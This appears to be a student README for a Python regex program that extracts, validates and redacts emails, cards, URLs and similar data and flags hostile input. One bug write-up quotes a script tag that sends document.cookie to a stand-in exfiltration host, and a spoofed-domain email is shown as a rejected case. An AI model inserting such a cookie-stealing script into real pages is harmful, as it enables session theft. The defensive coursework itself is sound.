# ALU Regex Data Extraction & Secure Validation

This is my submission for the Data Extraction & Secure Validation formative. It is a Python program that uses regular expressions to pull structured data out of messy raw text, checks that what it found is actually valid, and writes the results to a JSON file without exposing anything sensitive.

## The task

The brief was to act as a junior developer working on a system that receives large amounts of raw text from an external API. The program had to:

* extract at least four data types from the text (emails and credit cards were compulsory)
* validate the three ALU email domains: `@alueducation.com`, `@alumni.alueducation.com` and `@si.alueducation.com`
* reject or ignore malformed and malicious input
* protect sensitive data like emails and card numbers in the output
* use a realistic, production style input file rather than a simplified one

I implemented all eight data types.

## Running it

Python 3.8 or newer. No packages needed.

```bash
python3 src/main.py
python3 src/main.py --self-test
```

The first command reads `input/raw-text.txt`, prints a summary and writes `output/sample-output.json`. The second runs 34 tests covering the edge cases.

## Structure

```
input/raw-text.txt
src/main.py
output/sample-output.json
README.md
```

## How it works

The program runs in three stages that I kept separate on purpose:

1. **Sanitise**: normalise Unicode, strip control characters, skip lines that are suspiciously long, and scan for known attack patterns.
2. **Extract**: regex finds candidates based on their shape.
3. **Validate and redact**: normal Python code checks whether each candidate is real, then masks it before it goes anywhere near the output.

I split it this way because a regex can only describe shape, not meaning. It can tell you that something looks like a 16 digit card number. It cannot tell you whether the checksum is valid. Trying to force all of that into one huge pattern gives you something nobody can read or fix.

## What it extracts

* **Emails**: local part limited to 64 characters, DNS label rules, no double dots, plus the ALU classification.
* **URLs**: only `http` and `https`. Ports are range checked and URLs with embedded credentials are rejected.
* **Phone numbers**: length checked against E.164 (7 to 15 digits). A `(0)` trunk prefix is removed. Region is labelled where possible.
* **Credit cards**: Luhn checksum, 13 to 19 digits, issuer brand identified.
* **Times**: both 12 hour and 24 hour. Valid ranges are built into the pattern and everything is normalised to 24 hour.
* **HTML tags**: listed and flagged if dangerous, but never parsed (see below).
* **Hashtags**: hex colours like `#FF5733` and HTML entities like `&#39;` are excluded.
* **Currency**: symbol or code before the number (`$1,299.99`, `RWF 45,000`) or after it (`42.00 EUR`).

## ALU email validation

The three ALU checks are anchored with `^` and `$` so the whole string has to match, not just part of it. This matters more than it sounds. Without anchors, a search would happily accept

```
k.mugisha@alueducation.com.attacker.net
```

because the text `@alueducation.com` really is in there. It just is not the end of the string. That exact address sits in my input file and the program rejects it, along with `@alumni.alueducation.co` which is one letter short. This is the difference between searching for a pattern and validating against one.

## Security

The input is never trusted. It is not executed, not passed to a shell, not rendered as HTML and not used to build a query.

The program checks for eleven kinds of hostile input: script tags, inline event handlers, `javascript:` and `data:` URLs, SQL injection, template injection, command injection, path traversal, CRLF injection, NoSQL operators and null bytes. The sample run catches 15 of them.

Nothing sensitive is written to the output. Cards show only the last four digits. Emails keep the first two characters and the domain. Hostile payloads are stored as SHA-256 fingerprints, which is enough to audit a finding but useless to anyone who gets hold of the report.

Two bugs I hit while building this, both worth mentioning:

The URL pattern originally pulled a link out of `<script>fetch('https://exfil.evil...'+document.cookie)</script>` and wrote `document.cookie` into the report. The URL itself was perfectly well formed, so tightening the pattern would not have fixed it. The problem was where the URL was sitting, not what it looked like. Now anything found inside a hostile construct is quarantined as well.

The SQL check originally looked for a bare `--`, which fired on every `--- SECTION` heading in my own input file. Ten false positives in a 90 line file. A detector that cries wolf gets switched off, so it now needs a quote or semicolon next to the `--`. Detections dropped from 25 to 15, and all 15 are real.

Every quantifier in the patterns is bounded and there are hard limits on file size, line length and number of matches, so a hostile file cannot make the program hang (ReDoS).

One honest limit: a regex blocklist is a detection aid, not a security control. Real protection is parameterised queries and a proper sanitiser. These checks show awareness and catch obvious attacks. They are not exhaustive.

## Why the HTML tags are not parsed

`HTML_TAG_RE` only lists tag shaped tokens so dangerous ones can be flagged. It never rebuilds markup, and it should not. HTML is not a regular language, so nesting, comments and broken markup will defeat any pattern you write. The right tool is a real parser plus a sanitiser like `bleach` or DOMPurify. The same rule comes back in the web scraping unit: DOM selectors to extract, regex only to clean up the text afterwards.

## Edge cases

Run `--self-test` to see all 34. Some of the more interesting ones:

* `k@alueducation.com.attacker.net` is rejected because the `$` anchor refuses the suffix
* `4111 1111 1111 1112` has the right shape but fails Luhn, so it is rejected
* `4111111111111111111111` (22 digits) is rejected and reported rather than silently dropped
* `#FF5733` is not a hashtag, it is a hex colour
* `13:00 PM` and `24:00` are not valid times
* `12:00 AM` becomes `00:00` and `12:00 PM` stays `12:00` (the classic off by twelve bug)
* `+250 (0)791 762 771` gives 12 digits because `(0)` is a trunk prefix and is dropped
* `4713 7610 1432 4567` is counted as a card, not a phone number, because cards are matched first

## Results

```
 emails            17 valid,  2 rejected      ALU official : 5
 urls               6 valid,  4 rejected      ALU alumni   : 2
 phone_numbers      9 valid,  0 rejected      ALU SI       : 2
 credit_cards       4 valid,  3 rejected
 times             37 valid                   hostile patterns rejected: 15
 html_tags         14 valid,  7 rejected
 hashtags           9 valid
 currency_amounts  24 valid
```

The cards in the input are the published test numbers from the card networks (Visa `4111...`, Amex `3782...`). There is no real card data anywhere in this repo.

## About the input

`input/raw-text.txt` imitates an export from a partner CRM: support tickets typed by agents, gateway log lines, a CSV fragment somebody pasted by hand, and a block of untrusted HTML from a CMS. It is deliberately inconsistent, with mixed separators, stray spaces and both `12:00 PM` and `12:00` in the same document, because that is what production text actually looks like. Attack payloads are seeded throughout so the security code gets exercised rather than just described.

Built for the Front-end Web Development Formative.

